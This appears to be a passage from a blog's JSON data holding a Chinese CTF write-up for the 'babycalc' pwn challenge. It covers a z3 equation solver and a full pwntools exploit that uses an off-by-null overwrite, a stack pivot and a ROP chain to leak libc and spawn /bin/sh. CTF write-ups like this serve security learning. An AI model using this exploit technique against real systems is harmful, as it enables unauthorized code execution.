rbp，之后rsp会指向rbp+0x8），可以在前面填充`ret`提高命中率，最后需要返回`start`来调整栈帧。\n\n泄露了libc之后就可以走`system(\"/bin/sh\")`了，这一步同样需要爆破一下，使得能够`rsp`指向ROP链。**要注意system前调整栈对齐**。\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='babycalc'\nelf=ELF('./'+filename)\nlibc = ELF(\"./libc.so.6\")\np=process('./'+filename)\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\ndef pwn():\n  p=process('./'+filename)\n\n  try:\n\n    #leave=0x0000000000400bb7\n    ret=0x00000000004005b9\n    pop_rdi=0x0000000000400ca3\n    main_func=0x400789\n    start_addr=0x400650\n\n    # res to equation set\n    calc_value=p8(19)\n    calc_value+=p8(36)\n    calc_value+=p8(53)\n    calc_value+=p8(70)\n    calc_value+=p8(55)\n    calc_value+=p8(66)\n    calc_value+=p8(17)\n    calc_value+=p8(161)\n    calc_value+=p8(50)\n    calc_value+=p8(131)\n    calc_value+=p8(212)\n    calc_value+=p8(101)\n    calc_value+=p8(118)\n    calc_value+=p8(199)\n    calc_value+=p8(24)\n    calc_value+=p8(3)\n\n    # overwrite value\n    write_char='24' #0x18 ret_address=>leave\n    payload=write_char\n    payload=payload.ljust(0x48,'\\x00')\n    payload+=p64(ret)*0x6\n    payload+=p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])\n    payload+=p64(start_addr)\n\n    payload=payload.ljust(0xd0,'a')\n\n    payload+=calc_value\n\n\n    payload=payload.ljust(0xfc,'c')\n    payload+=p32(0x38) # i\n\n  \n    p.recvuntil('number-'+str(1)+':')\n\n    p.send(payload)\n    \n    p.recvuntil(\"good done\\n\")\n\n    puts_addr = u64(p.recvuntil('\\x7f',timeout=1)[-6:].ljust(8,'\\x00'))\n    if puts_addr == 0:\n      raise EOFError\n\n    leak(\"puts_addr\",hex(puts_addr))\n    #calc libc base\n    libcbase=puts_addr-libc.symbols['puts']\n    leak('libcbase',hex(libcbase))\n    sys_addr=libcbase+libc.symbols['system']\n    binsh_addr=libcbase+libc.search('/bin/sh').next()\n    leak('sys_addr',hex(sys_addr))\n    leak('binsh_addr',hex(binsh_addr))\n\n    # gdb.attach(p,'b *0x400bb7')\n    # pause()\n\n    #get shell \n    write_char=b'24' #0x18 ret_address=>leave\n    payload=write_char\n    payload=payload.ljust(0x48,'\\x00')\n\n    payload+=p64(ret)*0xd\n    payload+=p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)\n    # payload=payload.ljust(0xd0 - 0x20 + 8 - 0x10,'a')\n    # payload+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)\n\n    payload=payload.ljust(0xd0,'a')\n\n    payload+=calc_value\n\n    payload=payload.ljust(0xfc,'c')\n    payload+=p32(0x38) # i\n\n    p.recvuntil('number-'+str(1)+':')\n    gdb.attach(p,'b *0x400bb7')\n    p.send(payload)\n    \n    p.recvuntil(\"good done\\n\")\n\n    p.interactive()\n    return\n\n  except EOFError as e:\n    p.close()\n    raise e\n\n# pwn()\nwhile True:\n  try:\n    pwn()\n    break\n  except EOFError as e:\n    continue\n\n```\n\n\n\n\n\n\n\n","slug":"XHLJ-babycalc","published":1,"updated":"2023-03-08T11:19:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafo002f5oudbgf8gi59","content":"<p>没给libc，差评。保护就开了个NX，看起来还挺友好的。</p>\n<p>需要先用z3库解方程组，之后通过下标越界修改返回地址，并通过off-by-null覆盖rbp低位爆破栈迁移。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/XHLJ/babycalc/babycalc&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>主程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number-%d:&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(i + <span class=\"number\">1</span>));</span><br><span class=\"line\">  buf[(<span class=\"type\">int</span>)read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x100</span>uLL)] = <span class=\"number\">0</span>; <span class=\"comment\">//栈溢出 末尾0溢出</span></span><br><span class=\"line\">  v0 = strtol(buf, <span class=\"number\">0LL</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  *(&amp;v3 + i) = v0; <span class=\"comment\">//任意地址写</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v4 * v3 - v6 != <span class=\"number\">36182</span></span><br><span class=\"line\">  || v3 != <span class=\"number\">19</span></span><br><span class=\"line\">  || v5 * <span class=\"number\">19</span> * v4 + v6 != <span class=\"number\">36322</span></span><br><span class=\"line\">  || (v13 + v3 - v8) * v16 != <span class=\"number\">32835</span></span><br><span class=\"line\">  || (v4 * v3 - v5) * v6 != <span class=\"number\">44170</span></span><br><span class=\"line\">  || (v5 + v4 * v3) * v6 != <span class=\"number\">51590</span></span><br><span class=\"line\">  || v9 * v8 * v7 - v10 != <span class=\"number\">61549</span></span><br><span class=\"line\">  || v10 * v15 + v4 + v18 != <span class=\"number\">19037</span></span><br><span class=\"line\">  || v9 * v8 * v7 + v10 != <span class=\"number\">61871</span></span><br><span class=\"line\">  || (v8 * v7 - v9) * v10 != <span class=\"number\">581693</span></span><br><span class=\"line\">  || v11 != <span class=\"number\">50</span></span><br><span class=\"line\">  || (v9 + v8 * v7) * v10 != <span class=\"number\">587167</span></span><br><span class=\"line\">  || v13 * v12 * v11 - v14 != <span class=\"number\">1388499</span></span><br><span class=\"line\">  || v13 * v12 * v11 + v14 != <span class=\"number\">1388701</span></span><br><span class=\"line\">  || (v12 * v11 - v13) * v14 != <span class=\"number\">640138</span></span><br><span class=\"line\">  || (v11 * v5 - v16) * v12 != <span class=\"number\">321081</span></span><br><span class=\"line\">  || (v13 + v12 * v11) * v14 != <span class=\"number\">682962</span></span><br><span class=\"line\">  || v17 * v16 * v15 - v18 != <span class=\"number\">563565</span></span><br><span class=\"line\">  || v17 * v16 * v15 + v18 != <span class=\"number\">563571</span></span><br><span class=\"line\">  || v14 != <span class=\"number\">101</span></span><br><span class=\"line\">  || (v16 * v15 - v17) * v18 != <span class=\"number\">70374</span></span><br><span class=\"line\">  || (v17 + v16 * v15) * v18 != <span class=\"number\">70518</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;good done&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>需要输入16次内容，每次都会输入<code>0x100</code>字节的内容，并且存在栈溢出，足够改写所有的变量，包括循环变量i。在这之后会使用<code>strtol(buf,0,10)</code>将字符串识别为一个<strong>1个字节的十进制数</strong>，并写到<code>*(&amp;v3 + i)</code>，由于<code>v3</code>和<code>i</code>都可由栈溢出控制，这相当于我们可以<strong>任意地址写一个字节</strong>（如果i&gt;15）。</p>\n<p>除此之外<code>buf[(int)read(0, buf, 0x100uLL)] = 0;</code>会在<code>buf</code>之后写入一个<code>&#39;\\x00&#39;</code>，可以<strong>覆盖rbp的低字节</strong>。</p>\n<p>可以尝试一下栈迁移，先覆盖rbp的低字节为<code>&#39;\\x00&#39;</code>，之后使用任意地址写将返回地址改为<code>leave ret</code>的地址。修改后的rbp有可能会指向我们的buf中，在buf中构造好ROP链，<strong>爆破</strong>一下估计就可以了。</p>\n<p>不过为了让程序能够返回，我们要先绕过前面的判断条件。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v4 * v3 - v6 != <span class=\"number\">36182</span></span><br><span class=\"line\">  || v3 != <span class=\"number\">19</span></span><br><span class=\"line\">  || v5 * <span class=\"number\">19</span> * v4 + v6 != <span class=\"number\">36322</span></span><br><span class=\"line\">  || (v13 + v3 - v8) * v16 != <span class=\"number\">32835</span></span><br><span class=\"line\">  || (v4 * v3 - v5) * v6 != <span class=\"number\">44170</span></span><br><span class=\"line\">  || (v5 + v4 * v3) * v6 != <span class=\"number\">51590</span></span><br><span class=\"line\">  || v9 * v8 * v7 - v10 != <span class=\"number\">61549</span></span><br><span class=\"line\">  || v10 * v15 + v4 + v18 != <span class=\"number\">19037</span></span><br><span class=\"line\">  || v9 * v8 * v7 + v10 != <span class=\"number\">61871</span></span><br><span class=\"line\">  || (v8 * v7 - v9) * v10 != <span class=\"number\">581693</span></span><br><span class=\"line\">  || v11 != <span class=\"number\">50</span></span><br><span class=\"line\">  || (v9 + v8 * v7) * v10 != <span class=\"number\">587167</span></span><br><span class=\"line\">  || v13 * v12 * v11 - v14 != <span class=\"number\">1388499</span></span><br><span class=\"line\">  || v13 * v12 * v11 + v14 != <span class=\"number\">1388701</span></span><br><span class=\"line\">  || (v12 * v11 - v13) * v14 != <span class=\"number\">640138</span></span><br><span class=\"line\">  || (v11 * v5 - v16) * v12 != <span class=\"number\">321081</span></span><br><span class=\"line\">  || (v13 + v12 * v11) * v14 != <span class=\"number\">682962</span></span><br><span class=\"line\">  || v17 * v16 * v15 - v18 != <span class=\"number\">563565</span></span><br><span class=\"line\">  || v17 * v16 * v15 + v18 != <span class=\"number\">563571</span></span><br><span class=\"line\">  || v14 != <span class=\"number\">101</span></span><br><span class=\"line\">  || (v16 * v15 - v17) * v18 != <span class=\"number\">70374</span></span><br><span class=\"line\">  || (v17 + v16 * v15) * v18 != <span class=\"number\">70518</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这相当于解一个方程组，官方wp是用py的z3库去算的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v5 * v4 * v3 - v6 = 36182</span><br><span class=\"line\">v3 = 19</span><br><span class=\"line\">v5 * 19 * v4 + v6 = 36322</span><br><span class=\"line\">(v13 + v3 - v8) * v16 = 32835</span><br><span class=\"line\">(v4 * v3 - v5) * v6 = 44170</span><br><span class=\"line\">(v5 + v4 * v3) * v6 = 51590</span><br><span class=\"line\">v9 * v8 * v7 - v10 = 61549</span><br><span class=\"line\">v10 * v15 + v4 + v18 = 19037</span><br><span class=\"line\">v9 * v8 * v7 + v10 = 61871</span><br><span class=\"line\">(v8 * v7 - v9) * v10 = 581693</span><br><span class=\"line\">v11 = 50</span><br><span class=\"line\">(v9 + v8 * v7) * v10 = 587167</span><br><span class=\"line\">v13 * v12 * v11 - v14 = 1388499</span><br><span class=\"line\">v13 * v12 * v11 + v14 = 1388701</span><br><span class=\"line\">(v12 * v11 - v13) * v14 = 640138</span><br><span class=\"line\">(v11 * v5 - v16) * v12 = 321081</span><br><span class=\"line\">(v13 + v12 * v11) * v14 ! 682962</span><br><span class=\"line\">v17 * v16 * v15 - v18 = 563565</span><br><span class=\"line\">v17 * v16 * v15 + v18 = 563571</span><br><span class=\"line\">v14 = 101</span><br><span class=\"line\">(v16 * v15 - v17) * v18 = 70374</span><br><span class=\"line\">(v17 + v16 * v15) * v18 = 70518 </span><br></pre></td></tr></table></figure>\n\n<p>py脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span>*</span><br><span class=\"line\">v=[BitVec(<span class=\"string\">&#x27;v%d&#x27;</span>%i,<span class=\"number\">8</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>)]</span><br><span class=\"line\">s=Solver()</span><br><span class=\"line\">s.add(v[<span class=\"number\">2</span>] * v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>] - v[<span class=\"number\">3</span>] == <span class=\"number\">36182</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">0</span>] == <span class=\"number\">19</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">2</span>] * v[<span class=\"number\">0</span>] * v[<span class=\"number\">1</span>] + v[<span class=\"number\">3</span>] == <span class=\"number\">36322</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">10</span>] + v[<span class=\"number\">0</span>] - v[<span class=\"number\">5</span>]) * v[<span class=\"number\">13</span>] == <span class=\"number\">32835</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>] - v[<span class=\"number\">2</span>]) * v[<span class=\"number\">3</span>] == <span class=\"number\">44170</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">2</span>] + v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>]) * v[<span class=\"number\">3</span>] == <span class=\"number\">51590</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">6</span>] * v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] - v[<span class=\"number\">7</span>] == <span class=\"number\">61549</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">7</span>] * v[<span class=\"number\">12</span>] + v[<span class=\"number\">1</span>] + v[<span class=\"number\">15</span>] == <span class=\"number\">19037</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">6</span>] * v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] + v[<span class=\"number\">7</span>] == <span class=\"number\">61871</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] - v[<span class=\"number\">6</span>]) * v[<span class=\"number\">7</span>] == <span class=\"number\">581693</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">8</span>] == <span class=\"number\">50</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">6</span>] + v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>]) * v[<span class=\"number\">7</span>] == <span class=\"number\">587167</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">10</span>] * v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] - v[<span class=\"number\">11</span>] == <span class=\"number\">1388499</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">10</span>] * v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] + v[<span class=\"number\">11</span>] == <span class=\"number\">1388701</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] - v[<span class=\"number\">10</span>]) * v[<span class=\"number\">11</span>] == <span class=\"number\">640138</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">8</span>] * v[<span class=\"number\">2</span>] - v[<span class=\"number\">13</span>]) * v[<span class=\"number\">9</span>] == <span class=\"number\">321081</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">10</span>] + v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>]) * v[<span class=\"number\">11</span>] == <span class=\"number\">682962</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">14</span>] * v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] - v[<span class=\"number\">15</span>] == <span class=\"number\">563565</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">14</span>] * v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] + v[<span class=\"number\">15</span>] == <span class=\"number\">563571</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">11</span>] == <span class=\"number\">101</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] - v[<span class=\"number\">14</span>]) * v[<span class=\"number\">15</span>] == <span class=\"number\">70374</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">14</span>] + v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>]) * v[<span class=\"number\">15</span>] == <span class=\"number\">70518</span>) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> s.check() == sat:  </span><br><span class=\"line\">      m = s.model()  </span><br><span class=\"line\">      <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):  </span><br><span class=\"line\">          <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(m[v[i]].as_long())</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;error&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3~v18</span><br><span class=\"line\">0x13</span><br><span class=\"line\">0xa4</span><br><span class=\"line\">0x75</span><br><span class=\"line\">0xc6</span><br><span class=\"line\">0x17</span><br><span class=\"line\">0x82</span><br><span class=\"line\">0x11</span><br><span class=\"line\">0x21</span><br><span class=\"line\">0x32</span><br><span class=\"line\">0x43</span><br><span class=\"line\">0x54</span><br><span class=\"line\">0x65</span><br><span class=\"line\">0xf6</span><br><span class=\"line\">0x7</span><br><span class=\"line\">0x18</span><br><span class=\"line\">0x3</span><br></pre></td></tr></table></figure>\n\n<p>之后就可以开始进行利用了，首先需要泄露libc，由于开启了<code>ASLR</code>，因此这一步需要爆破一下，使得低字节被覆盖为为<code>&#39;\\x00&#39;</code>的rbp能指向<code>ROP链+0x8</code>的位置（leave会pop rbp，之后rsp会指向rbp+0x8），可以在前面填充<code>ret</code>提高命中率，最后需要返回<code>start</code>来调整栈帧。</p>\n<p>泄露了libc之后就可以走<code>system(&quot;/bin/sh&quot;)</code>了，这一步同样需要爆破一下，使得能够<code>rsp</code>指向ROP链。<strong>要注意system前调整栈对齐</strong>。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;babycalc&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">  p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">try</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#leave=0x0000000000400bb7</span></span><br><span class=\"line\">    ret=<span class=\"number\">0x00000000004005b9</span></span><br><span class=\"line\">    pop_rdi=<span class=\"number\">0x0000000000400ca3</span></span><br><span class=\"line\">    main_func=<span class=\"number\">0x400789</span></span><br><span class=\"line\">    start_addr=<span class=\"number\">0x400650</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># res to equation set</span></span><br><span class=\"line\">    calc_value=p8(<span class=\"number\">19</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">36</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">53</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">70</span>)</span><br><span class=\"line\">    